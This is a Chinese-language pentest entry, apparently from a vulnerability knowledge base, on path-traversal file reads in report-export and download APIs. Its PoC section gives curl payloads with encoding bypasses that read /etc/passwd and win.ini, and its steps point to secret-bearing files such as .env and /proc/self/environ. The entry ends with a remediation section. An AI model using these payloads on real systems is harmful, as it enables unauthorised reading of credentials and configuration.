---
title: 导出 / 下载接口任意文件读取
cve: 无（实现缺陷）
severity: high
cvss: 8.6
product: 对账单 / 报表导出 / 凭证下载
versions: 任意
ports: 80, 443
keywords: 任意文件读, download, export, path traversal, 对账单
entry: /api/report/export?file=../../../../etc/passwd
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE）
---

## 指纹

```
/api/report/export?file=2024-11.xlsx       /download?path=upload/1.jpg
/api/statement/export?name=...             /api/member/avatar?file=...
```

参数直接当文件路径拼，且没做目录限制。

## 前置条件

- 账号（有些导出接口只要登录，有些前台匿名）。

## PoC

```bash
# Linux
curl -s --path-as-is 'https://target/api/report/export?file=../../../../etc/passwd'
curl -s --path-as-is 'https://target/api/report/export?file=/etc/passwd'

# Windows
curl -s --path-as-is 'https://target/api/report/export?file=..%5c..%5c..%5cwindows%5cwin.ini'

# 编码绕过
curl -s --path-as-is 'https://target/api/report/export?file=..%2f..%2f..%2fetc%2fpasswd'
curl -s --path-as-is 'https://target/api/report/export?file=....//....//etc/passwd'
```

## 利用步骤

1. 找导出/下载接口，先正常导出一次确认参数形态与返回（是流还是 URL）。
2. 用 `../`、绝对路径、编码、`....//` 四种形态各试一次。
3. 命中后读：`/etc/passwd`、应用配置（`.env`、`config.php`、`application.yml`）、`/proc/self/environ`。
4. 有日志写入权限时读 access log 找更多路径；Windows 目标读 `C:\Windows\win.ini` 验证。
5. 证据：一条命中请求 + 首 20 行内容；别整文件下载。

## 修复与缓解（加固）

- 只允许白名单文件名（用 ID 映射到磁盘路径），禁止路径拼接。
- `realpath` 后校验仍在指定目录内；下载走临时签名 URL。
- 导出目录与 webroot 分离；文件权限最小化。

## 参考

- OWASP WSTG-ATHZ-01；CWE-22 Path Traversal。
